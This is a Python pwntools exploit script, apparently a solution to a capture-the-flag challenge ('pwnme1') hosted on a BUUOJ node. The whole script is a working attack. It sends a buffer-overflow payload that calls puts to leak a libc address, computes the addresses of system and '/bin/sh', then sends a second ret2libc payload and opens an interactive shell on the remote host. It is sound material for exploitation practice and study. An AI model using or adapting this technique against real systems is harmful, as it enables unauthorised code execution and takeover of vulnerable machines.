from pwn import *

#context.log_level = 'debug'

pn = './pwnme1'
#p = process(pn)
p = remote('node4.buuoj.cn', 29847)
elf = ELF(pn)
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.buu.so')

vul = elf.sym['getfruit']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

p.sendlineafter(b'>> 6. Exit    \n', b'5')

payload = b'a' * ( 0xa4 + 4 ) + p32(puts_plt) + p32(vul) + p32(puts_got)

p.sendlineafter(b'fruit:', payload)

p.recvuntil('\n')
libc_base = u32(p.recv(4)) - libc.sym['puts']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * ( 0xa4 + 4 ) + p32(system) + p32(0) + p32(bin_sh)

p.sendlineafter(b'fruit:', payload)

p.recvuntil('...\n')
p.interactive()